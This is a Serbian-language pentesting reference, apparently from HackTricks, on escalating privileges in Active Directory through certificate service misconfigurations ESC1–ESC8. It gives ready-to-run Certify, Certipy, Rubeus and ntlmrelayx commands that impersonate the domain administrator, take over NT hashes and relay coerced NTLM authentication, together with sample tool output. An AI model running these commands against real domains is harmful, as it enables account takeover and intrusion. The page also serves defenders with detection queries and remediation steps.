# AD CS: eskalacija u domenu

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak sekcija tehnika eskalacije iz postova:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enrolment rights su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.**
- **Odobrenje menadžera nije obavezno.**
- **Nisu potrebni potpisi ovlašćenog osoblja.**
- **Security descriptors na predlošcima sertifikata su previše permisivni, što omogućava korisnicima sa niskim privilegijama da dobiju enrolment rights.**
- **Predlošci sertifikata su konfigurisani da definišu EKU-e koji olakšavaju autentifikaciju:**
- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **Predložak dozvoljava podnosiocima zahteva da uključe subjectAltName u Certificate Signing Request (CSR):**
- Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present. This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag permits the specification of the SAN by the requester.

> [!CAUTION]
> Konfiguracija opisana ovde omogućava korisnicima sa niskim privilegijama da zahtevaju sertifikate sa bilo kojim SAN-om po izboru, čime je omogućena autentifikacija kao bilo koji domen principal preko Kerberos-a ili SChannel-a.

Ova opcija je ponekad omogućena da bi se podržala on-the-fly generacija HTTPS ili host sertifikata od strane proizvoda ili deployment servisa, ili zbog nedostatka razumevanja.

Primećeno je da pravljenje sertifikata sa ovom opcijom generiše upozorenje, što nije slučaj kada se postojeći predložak sertifikata (npr. `WebServer` template, koji ima `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` omogućen) duplira i zatim izmeni da uključi authentication OID.

### Abuse

Da biste **pronašli ranjive predloške sertifikata** možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da bi se **iskoristila ova ranjivost za lažno predstavljanje kao administrator**, može se pokrenuti:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete transformisati generisani **sertifikat u `.pfx`** format i koristiti ga za **autentifikaciju koristeći Rubeus ili certipy** ponovo:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binarni fajlovi "Certreq.exe" i "Certutil.exe" mogu se koristiti za generisanje PFX-a: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeraciju šablona sertifikata u konfiguracionoj šemi AD Foresta, tačnije onih koji ne zahtevaju odobrenje ili potpise, koji imaju Client Authentication ili Smart Card Logon EKU, i kojima je omogućena zastavica `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, moguće je izvršiti pokretanjem sledećeg LDAP upita:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

Drugi scenario zloupotrebe je varijacija prvog:

1. Prava za upis (enrollment) su dodeljena niskoprivilegovanim korisnicima od strane Enterprise CA.
2. Zahtev za odobrenje menadžera je onemogućen.
3. Zahtev za ovlašćene potpise je izostavljen.
4. Previše permisivan security descriptor na šablonu sertifikata dodeljuje prava za enrollment niskoprivilegovanim korisnicima.
5. **Šablon sertifikata je definisan da uključuje Any Purpose EKU ili nema EKU.**

The **Any Purpose EKU** omogućava napadaču da dobije sertifikat za **bilo koju svrhu**, uključujući autentifikaciju klijenta, autentifikaciju servera, potpisivanje koda itd. Ista **technique used for ESC3** može se upotrebiti za eksploataciju ovog scenarija.

Sertifikati sa **bez EKU**, koji funkcionišu kao subordinate CA sertifikati, mogu se iskoristiti za **bilo koju svrhu** i **takođe se mogu koristiti za potpisivanje novih sertifikata**. Dakle, napadač bi mogao da specificira proizvoljne EKU-ove ili polja u novim sertifikatima koristeći subordinate CA sertifikat.

Međutim, novi sertifikati kreirani za **domain authentication** neće funkcionisati ako subordinate CA nije poverena od strane **`NTAuthCertificates`** objekta, što je podrazumevana postavka. Ipak, napadač i dalje može da kreira **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Ovo bi moglo biti potencijalno **zloupotrebljeno** za širok spektar svrha (npr. potpisivanje koda, autentifikacija servera, itd.) i može imati značajne implikacije za druge aplikacije u mreži kao što su SAML, AD FS ili IPSec.

Da biste izlistali šablone koji odgovaraju ovom scenariju u konfiguracionoj šemi AD Foresta, može se pokrenuti sledeći LDAP upit:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

Ovaj scenario je sličan prvom i drugom, ali zloupotrebljava drugačiji EKU (Certificate Request Agent) i 2 različita template-a (stoga ima 2 skupa zahteva).

The Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1), known as Enrollment Agent in Microsoft documentation, omogućava entitetu (principal) da se enroll-uje za certificate u ime drugog korisnika.

The “enrollment agent” enroll-uje u takav template i koristi resultant certificate da ko-potpiše CSR u ime drugog korisnika. Zatim šalje ko-potpisani CSR ka CA, enroll-uje u template koji dozvoljava “enroll on behalf of”, i CA odgovara sa certificate koji pripada „drugom“ korisniku.

**Requirements 1:**

- Enrollment rights su dodeljena low-privileged users od strane Enterprise CA.
- Zahtjev za manager approval je izostavljen.
- Nema zahteva za authorized signatures.
- The security descriptor of the certificate template je previše permisivan, dodeljujući enrollment rights low-privileged users.
- The certificate template uključuje Certificate Request Agent EKU, omogućavajući zahtev za druge certificate template-e u ime drugih principal-a.

**Requirements 2:**

- Enterprise CA dodeljuje enrollment rights low-privileged users.
- Manager approval je zaobiđen.
- Verzija šeme template-a je ili 1 ili veća od 2, i specificira Application Policy Issuance Requirement koja zahteva Certificate Request Agent EKU.
- EKU definisan u certificate template-u omogućava domain authentication.
- Restrikcije za enrollment agente nisu primenjene na CA.

### Abuse

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) da zloupotrebite ovaj scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Korisnici koji su dozvoljeni da dobiju **enrollment agent certificate**, šabloni u koje se **enrollment agents** smeju prijaviti, i **accounts** u čije ime enrollment agent može da deluje mogu biti ograničeni od strane enterprise CA. Ovo se postiže otvaranjem `certsrc.msc` **snap-in**, **desnim klikom na CA**, **izborom Properties**, i zatim **navigacijom** na karticu “Enrollment Agents”.

Ipak, primećeno je da je **default** podešavanje za CA da bude “**Do not restrict enrollment agents**.” Kada administratori omoguće ograničenje za enrollment agente i postave ga na “Restrict enrollment agents”, podrazumevana konfiguracija i dalje ostaje izuzetno permisivna. Ona dozvoljava **Everyone** pristup da se upiše u sve šablone kao bilo ko.

## Ranljiva kontrola pristupa šablonima sertifikata - ESC4

### **Objašnjenje**

**security descriptor** na **certificate templates** definiše **permissions** koje specifični **AD principals** imaju u vezi sa šablonom.

Ako **attacker** poseduje potrebne **permissions** da **alter** **template** i **institute** bilo koje **exploitable misconfigurations** opisane u **prior sections**, to može omogućiti **privilege escalation**.

Značajne permissions koje se primenjuju na certificate templates uključuju:

- **Owner:** Dodeljuje implicitnu kontrolu nad objektom, omogućavajući izmene bilo kojih atributa.
- **FullControl:** Omogućava potpunu vlast nad objektom, uključujući mogućnost izmene svih atributa.
- **WriteOwner:** Dozvoljava promenu vlasnika objekta u principal koji je pod kontrolom **attacker**.
- **WriteDacl:** Dozvoljava podešavanje kontrola pristupa, potencijalno dodeljujući **attacker**-u FullControl.
- **WriteProperty:** Ovlašćuje uređivanje bilo kojih svojstava objekta.

### Zloupotreba

Da biste identifikovali principals sa pravima za izmenu na šablonima i drugim PKI objektima, enumerišite pomoću Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 označava situaciju kada korisnik ima privilegije za pisanje nad šablonom sertifikata. To se, na primer, može zloupotrebiti da bi se prepisala konfiguracija šablona sertifikata i učinilo da šablon postane ranjiv na ESC1.

Kao što vidimo u putanji iznad, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` vezu ka `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Evo malog uvida u Certipy’s `shadow auto` komandu za preuzimanje NT hasha žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može prepisati konfiguraciju šablona sertifikata jednom naredbom. **Podrazumevano**, Certipy će **prepisati** konfiguraciju da bi je učinila **ranjivom na ESC1**. Takođe možemo navesti **`-save-old` parametar da sačuvamo staru konfiguraciju**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Ranjiva kontrola pristupa PKI objekata - ESC5

### Objašnjenje

Opsežna mreža međusobno povezanih odnosa zasnovanih na ACL-ovima, koja uključuje više objekata osim certificate templates i certificate authority, može uticati na bezbednost celog AD CS sistema. Ovi objekti, koji značajno mogu uticati na bezbednost, obuhvataju:

- AD computer object CA server-a, koji može biti kompromitovan kroz mehanizme kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server CA server-a.
- Bilo koji descendant AD object ili container unutar konkretne putanje kontejnera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja uključuje, ali nije ograničena na, kontejnere i objekte kao što su the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, i the Enrollment Services Container.

Bezbednost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama stekne kontrolu nad bilo kojim od ovih kritičnih komponenti.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema obrađena u [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) takođe dodiruje implikacije zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kako to Microsoft navodi. Ova konfiguracija, kada je aktivirana na Certification Authority (CA), omogućava uključivanje **user-defined values** u **subject alternative name** za **bilo koji zahtev**, uključujući one konstruisane iz Active Directory®. Posledično, ovo omogućava napadaču da se upiše (enroll) preko **bilo kojeg template-a** podešenog za domen **authentication**—posebno onih otvorenih za upis neprivilegovanih korisnika, kao što je standardni User template. Kao rezultat, može se dobiti sertifikat koji omogućava napadaču da se autentifikuje kao domain administrator ili **bilo koja druga aktivna entiteta** u domenu.

**Note**: Pristup dodavanju **alternative names** u Certificate Signing Request (CSR), kroz argument `-attrib "SAN:"` u `certreq.exe` (nazvane “Name Value Pairs”), predstavlja **kontrast** u odnosu na strategiju iskorišćavanja SAN-ova u ESC1. Ovde je razlika u tome **kako su informacije o nalogu enkapsulirane**—u atribut sertifikata, umesto u ekstenziju.

### Zloupotreba

Da bi proverile da li je podešavanje aktivirano, organizacije mogu koristiti sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija u suštini koristi **remote registry access**, stoga bi alternativni pristup mogao biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati poput [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu otkriti ovu pogrešnu konfiguraciju i iskoristiti je:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Da biste promenili ova podešavanja, pod pretpostavkom da posedujete **administrativna prava domena** ili ekvivalentna, sledeću naredbu možete izvršiti sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u svom okruženju, zastavicu možete ukloniti pomoću:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022, novoizdate **certificates** će sadržavati **security extension** koji uključuje **requester's `objectSid` property`**. Za ESC1, ovaj SID se izvodi iz specificiranog SAN. Međutim, za **ESC6**, SID odražava **requester's `objectSid`**, a ne SAN.\
> Da bi se iskoristio ESC6, neophodno je da sistem bude podložan ESC10 (Weak Certificate Mappings), koji daje prednost **SAN over the new security extension**.

## Ranjiva Certificate Authority Access Control - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa za certificate authority se održava skupom dozvola koje regulišu radnje CA. Ove dozvole se mogu pregledati pokretanjem `certsrv.msc`, desnim klikom na CA, izborom Properties, a zatim prelaskom na Security tab. Dodatno, dozvole se mogu izlistati koristeći PSPKI modul sa komandama kao što su:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Ovo daje uvid u primarna prava, naime **`ManageCA`** i **`ManageCertificates`**, koja odgovaraju ulogama „administrator CA” i „menadžer sertifikata”.

#### Zloupotreba

Imati **`ManageCA`** prava na sertifikacionom autoritetu omogućava subjektu da daljinski menja podešavanja koristeći PSPKI. To uključuje prebacivanje **`EDITF_ATTRIBUTESUBJECTALTNAME2`** oznake da dozvoli navođenje SAN u bilo kom šablonu, što je ključan aspekt eskalacije privilegija unutar domena.

Pojednostavljenje ovog procesa moguće je korišćenjem PSPKI-jevog **Enable-PolicyModuleFlag** cmdlet-a, što omogućava izmene bez direktne interakcije sa GUI-jem.

Posedovanje **`ManageCertificates`** prava olakšava odobravanje zahteva na čekanju, efikasno zaobilazeći zaštitu "CA certificate manager approval".

Kombinacija **Certify** i **PSPKI** modula može se koristiti za zahtev, odobrenje i preuzimanje sertifikata:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Napad 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** **`Manage CA`** dozvole su korišćene da **omoguće** flag **EDITF_ATTRIBUTESUBJECTALTNAME2** za izvođenje **ESC6 attack**, ali ovo neće imati efekta dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima `Manage CA` pravo pristupa, tom korisniku je takođe dozvoljeno da **restartuje servis**. Međutim, to **ne znači da korisnik može restartovati servis udaljeno**. Nadalje, E**SC6 možda neće raditi odmah** u većini ažuriranih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Stoga je ovde predstavljen drugi napad.

Preduslovi:

- Samo **`ManageCA` dozvola**
- **`Manage Certificates`** dozvola (može se dodeliti iz **`ManageCA`**)
- Šablon sertifikata **`SubCA`** mora biti **omogućen** (može se omogućiti iz **`ManageCA`**)

Tehnika se zasniva na činjenici da korisnici sa `Manage CA` _i_ `Manage Certificates` pravom pristupa mogu **podneti neuspešne zahteve za sertifikat**. Šablon sertifikata **`SubCA`** je **ranjiv na ESC1**, ali **samo administratori** mogu da se upišu u šablon. Dakle, **korisnik** može **zatražiti** upis u **`SubCA`** — što će biti **odbijeno** — ali će **naknadno biti izdat od strane menadžera**.

#### Zloupotreba

Možete sebi **dodeliti `Manage Certificates`** pravo pristupa dodavanjem svog korisnika kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Šablon **`SubCA`** može biti **omogućen na CA** pomoću parametra `-enable-template`. Podrazumevano, šablon `SubCA` je omogućen.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi sa **zahtevanjem sertifikata zasnovanog na `SubCA` šablonu**.

**Ovaj zahtev će biti odbij**en, ali sačuvaćemo privatni ključ i zabeležiti ID zahteva.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sa našim **`Manage CA` and `Manage Certificates`**, možemo potom **izdati prethodno neuspeo zahtev za sertifikat** pomoću komande `ca` i parametra `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I na kraju, možemo **preuzeti izdat sertifikat** pomoću `req` komande i parametra `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Napad 3 – Abuziranje ekstenzije Manage Certificates (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanje EDITF atributa ili odobravanje pending zahteva), **Certify 2.0** je otkrio potpuno novu primitivu koja zahteva samo ulogu *Manage Certificates* (poznatu i kao **Certificate Manager / Officer**) na Enterprise CA.

Metod RPC `ICertAdmin::SetExtension` može da izvrši bilo koji principal koji ima *Manage Certificates*. Dok je metod tradicionalno korišćen od strane legitimnih CA za ažuriranje ekstenzija na **pending** zahtevima, napadač ga može zloupotrebiti da **doda *nepodrazumevanu* ekstenziju sertifikata** (na primer prilagođeni *Certificate Issuance Policy* OID kao `1.1.1.1`) na zahtev koji čeka odobrenje.

Pošto ciljani template **ne definiše podrazumevanu vrednost za tu ekstenziju**, CA NEĆE prepisati vrednost koju kontroliše napadač kada se zahtev konačno izdaje. Rezultujući sertifikat zato sadrži napadačem izabranu ekstenziju koja može:

* Zadovoljiti zahteve Application / Issuance Policy drugih ranjivih template-a (što vodi do eskalacije privilegija).
* Ubaciti dodatne EKU-e ili politike koje daju sertifikatu neočekivano poverenje u sistemima trećih strana.

Ukratko, *Manage Certificates* – ranije smatrano „manje moćnom“ polovinom ESC7 – sada se može iskoristiti za potpunu eskalaciju privilegija ili dugotrajnu persistenciju, bez menjanja konfiguracije CA ili potrebe za strožim pravom *Manage CA*.

#### Abuziranje primitive sa Certify 2.0

1. **Podnesite zahtev za sertifikat koji će ostati *pending*.** Ovo se može prisiliti template-om koji zahteva odobrenje menadžera:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dodajte prilagođenu ekstenziju na pending zahtev** koristeći novu `manage-ca` komandu:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ako template već ne definiše ekstenziju *Certificate Issuance Policies*, vrednost iznad će biti sačuvana nakon izdavanja.*

3. **Izdajte zahtev** (ako vaša uloga takođe ima odobravanje *Manage Certificates*) ili sačekajte da ga operator odobri. Kada se izda, skinite sertifikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Rezultujući sertifikat sada sadrži zlonamerni issuance-policy OID i može se koristiti u narednim napadima (npr. ESC13, domain escalation, itd.).

> NOTE: Isti napad se može izvesti i sa Certipy ≥ 4.7 preko `ca` komande i `-set-extension` parametra.

## NTLM Relay na AD CS HTTP endpoint-e – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima gde je **AD CS instaliran**, ako postoji ranjiv **web enrollment endpoint** i bar jedan **certificate template je objavljen** koji dozvoljava **domain computer enrollment i client authentication** (kao podrazumevani **`Machine`** template), postaje moguće da **bilo koji računar sa aktivnim spooler servisom bude kompromitovan od strane napadača**!

AD CS podržava više **HTTP-based enrollment** metoda, dostupnih kroz dodatne serverske role koje administratori mogu instalirati. Ovi HTTP interfejsi za enrolment su podložni **NTLM relay attacks**. Napadač, sa kompromitovane mašine, može se lažno predstaviti kao bilo koji AD nalog koji se autentifikuje putem dolaznog NTLM-a. Dok se predstavlja kao žrtva, napadač može pristupiti ovim web interfejsima da **zatraži client authentication sertifikat koristeći `User` ili `Machine` certificate template-e**.

- **web enrollment interface** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`) po defaultu koristi samo HTTP, što ne pruža zaštitu protiv NTLM relay napada. Dodatno, eksplicitno dozvoljava samo NTLM autentikaciju kroz Authorization HTTP header, što onemogućava sigurnije metode autentikacije poput Kerberos-a.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, i **Network Device Enrollment Service** (NDES) po defaultu podržavaju negotiate autentikaciju preko Authorization HTTP header-a. Negotiate autentikacija **podržava i** Kerberos i **NTLM**, omogućavajući napadaču da se tokom relay napada **svede na NTLM**. Iako ovi web servisi podrazumevano omogućavaju HTTPS, sam HTTPS **ne štiti od NTLM relay napada**. Zaštita od NTLM relay napada za HTTPS servise je moguća samo kada je HTTPS kombinovan sa channel binding. Nažalost, AD CS ne aktivira Extended Protection for Authentication na IIS-u, što je potrebno za channel binding.

Čest problem kod NTLM relay napada je **kratko trajanje NTLM sesija** i nemogućnost napadača da interaguje sa servisima koji zahtevaju NTLM signing.

Ipak, ovo ograničenje može se prevazići iskorišćavanjem NTLM relay napada da se pribavi sertifikat za korisnika, jer period važenja tog sertifikata određuje trajanje sesije, i sertifikat se može koristiti sa servisima koji **zahtevaju NTLM signing**. Za uputstva o korišćenju ukradenog sertifikata, pogledajte:


{{#ref}}
account-persistence.md
{{#endref}}

Još jedno ograničenje NTLM relay napada je to što **mašina kojom napadač kontroliše mora biti autentifikovana od strane žrtvinog naloga**. Napadač može ili sačekati ili pokušati da **forsira** tu autentikaciju:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Zloupotreba**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumeriše **omogućene HTTP AD CS endpoint-e**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koristi se kod enterprise sertifikacionih autoriteta (CAs) za čuvanje Certificate Enrollment Service (CES) endpointa. Ovi endpointi se mogu parsirati i navesti korišćenjem alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Zloupotreba sa [Certipy](https://github.com/ly4k/Certipy)

Zahtev za sertifikat se podrazumevano pravi pomoću Certipy na osnovu templata `Machine` ili `User`, što se određuje time da li ime naloga koji se prosleđuje završava sa `$`. Navođenje alternativnog templata može se postići korišćenjem parametra `-template`.

Tehnika kao što je [PetitPotam](https://github.com/ly4k/PetitPotam) može se potom upotrebiti za prisiljavanje autentikacije. Kod rada sa domain controller-ima potrebno je navesti `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Bez sigurnosnog proširenja - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

Nova vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, nazvana ESC9, sprečava ugrađivanje **novog `szOID_NTDS_CA_SECURITY_EXT` sigurnosnog proširenja** u sertifikat. Ovaj flag postaje relevantan kada je `StrongCertificateBindingEnforcement` postavljen na `1` (podrazumevana vrednost), za razliku od podešavanja `2`. Njegova važnost raste u scenarijima gde slabije mapiranje sertifikata za Kerberos ili Schannel može biti iskorišćeno (kao kod ESC10), s obzirom da odsustvo ESC9 ne bi promenilo zahteve.

Uslovi pod kojima postavka ovog flaga postaje značajna uključuju:

- `StrongCertificateBindingEnforcement` nije podešen na `2` (podrazumevano `1`), ili `CertificateMappingMethods` uključuje flag `UPN`.
- Sertifikat je označen sa `CT_FLAG_NO_SECURITY_EXTENSION` flagom u `msPKI-Enrollment-Flag` podešavanju.
- Sertifikat navodi bilo koji client authentication EKU.
- `GenericWrite` dozvole su dostupne nad bilo kojim nalogom da bi se kompromitovao drugi.

### Scenarij zloupotrebe

